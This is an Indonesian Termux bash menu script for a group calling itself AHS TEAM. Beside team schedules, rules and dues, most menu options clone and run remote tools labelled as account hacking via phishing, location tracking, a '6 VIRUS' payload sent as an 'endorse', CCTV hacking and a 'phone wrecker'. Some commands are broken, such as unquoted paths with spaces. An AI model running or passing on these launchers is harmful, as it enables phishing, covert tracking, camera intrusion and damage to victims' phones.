clear
figlet AHS TERMUX | lolcat
echo "====================================================
# Coded   : A SETENGAH 12
# Contact : zainicahganteng246@gmail.com
# Team    : AHS TEAM
==========================================================" | lolcat
echo " PILIH NOMOR UNTUK MENDAPATKAN INFORMASI" | lolcat
echo " [01] Jadwal Shift" | lolcat
echo " [02] Peraturan" | lolcat
echo " [03] Penerima Anggota Baru" | lolcat
echo " [04] Jadwal Kas" | lolcat
echo " [05] Hack akun/dm" | lolcat
echo " [06] Lacak lokasi" | lolcat
echo " [07] Kirim Endorse" | lolcat
echo " [08] Hack cctv " | lolcat
echo " [09] Perusak hp " | lolcat
echo " [10] Penghancur hp " | lolcat
echo " [11] Penambahan alat " | lolcat
echo " Tulis nomor yang ingin kamu pilih di bawah ini ⬇ " | lolcat
read nomor

if [ $nomor = 1 ] || [ $nomor = 01 ]
then
clear
figlet JADWAL SHIFT | lolcat
echo " SHIFT MALAM" | lolcat
echo " A. ANONY SETENGAH 12" | lolcat
echo " B. mamanglubiz" | lolcat
echo " SHIFT PAGI" | lolcat
echo " A. PLAT L" | lolcat
echo " B. BANG JAK" | lolcat
echo " C. CAK GANTENG" | lolcat
echo " D. cak r" | lolcat
exit
fi

if [ $nomor = 2 ] || [ $nomor = 02 ]
then
clear
figlet PERATURAN | lolcat
echo " Dilarang melanggar peraturan" | lolcat
echo " Sanksi melanggar peraturan adalah : Denda 1k" | lolcat
echo " Peraturan :" | lolcat
echo " 01. Dilarang mengeluarkan aggota team dari group" | lolcat
echo " 02. Gak oleh nggarai" | lolcat
echo " 03. Dilarang mengoda sehingga menyebabkan bete pada anggota team" | lolcat
echo " 04. Patuhi aturan membayar kas" | lolcat
echo " 05. Dilarang marah marah hanya menasehati" | lolcat
echo " 06. JIKA ADA YANG BELUM KAS DI KASIH WAKTU 1 MINGGU DULU JIKA SUDAH 1 MINGGU BELUM BAYAR MAKA DOUBLE" | lolcat
exit
fi

if [ $nomor = 3 ] || [ $nomor = 03 ]
then
clear
figlet DAFTAR | lolcat
echo " NAMA ANGGOTA BARU" | lolcat
read nomor
echo " ALAMAT" | lolcat
read nomor
echo " SEKOLAH" | lolcat
read nomor 
echo " NO TLP" | lolcat
read nomor 
echo " SCREENSHOOT DULU SEBELUM DI ENTER" | lolcat
exit
fi

if [ $nomor = 4 ] || [ $nomor = 04 ]
then 
clear
figlet KAS TEAM | lolcat
echo " BAYAR KAS SETIAP HARI MINGGU" | lolcat
echo " KAS 2K" | lolcat
echo " JIKA ADA YANG BELUM BAYAR DI KASIH WAKTU 1 MINGGU DULU" | lolcat
echo " BENDAHARA M NUR ALIF" | lolcat
echo " SEKETARIS M NUR ALIF" | lolcat
echo " Yang sudah membayar" | lolcat
echo " A" | lolcat
read nomor
echo " B" | lolcat
read nomor
echo " C" | lolcat
read nomor
echo " D" | lolcat
read nomor
echo " E" | lolcat
read nomor
echo " F" | lolcat
read nomor
echo " G" | lolcat
read nomor
echo " H" | lolcat
read nomor
echo " I" | lolcat
read nomor
echo " J" | lolcat
read nomor
echo " SCRENSHOOT DULU SEBELUM DI ENTER" | lolcat
exit
fi

if [ $nomor = 5 ] || [ $nomor = 05 ]
then
clear
figlet HACK AKUN | lolcat
pkg install ruby toilet figlet -y
gem install lolcat -y
apt-get install bash -y
pkg install git -y
git clone https://github.com/wanirawan/piphish
sh run.sh
exit
fi

if [ $nomor = 6 ] || [ $nomor = 06 ]
then 
clear
figlet Lacak lokasi | lolcat
pkg install python -y
pkg install python2 -y
pkg install bash -y
pkg install git -y
pkg install wget -y
pkg install openssh -y
pkg install php -y
git clone https://github.com/thelinuxchoice/locator
cd locator
bash locator.sh
exit
fi

if [ $nomor = 7 ] || [ $nomor = 07 ]
then
clear
figlet KIRIM ENDORSE | lolcat
pkg install bash -y
pkg install git -y
git clone https://github.com/novalattasya/6 VIRUS
cd 6 VIRUS
sh 6 VIRUS.sh
exit
fi

if [ $nomor = 8 ] || [ $nomor = 08 ]
then
clear
figlet HACK CCTV | lolcat
pkg install python2 -y
pkg install git -y
pip2 install requests -y
git clone https://github.com/kancotdiq/ipcs
cd ipcs
python2 scan.py
exit
fi

if [ $nomor = 9 ] || [ $nomor = 09 ]
then
clear
figlet PERUSAK HP | lolcat
pkg install python2 -y
pkg install git -y
git clone https://github.com/justAHackers/perusak
cd perusak 
python2 perusak.py
exit
fi

if [ $nomor = 10 ] || [ $nomor = 10 ]
then
clear
figlet PENGHANCUR | lolcat
echo " Code not found" | lolcat
exit
fi

if [ $nomor = 11 ] || [ $nomor = 11 ]
then
clear
figlet PENAMBAH ALAT | lolcat
pkg install python -y
pkg install git -y
git clone https://github.com/kumpulanremaja/termuxtbb
cd termuxtbb
python kumpulanremaja.py
exit
fi

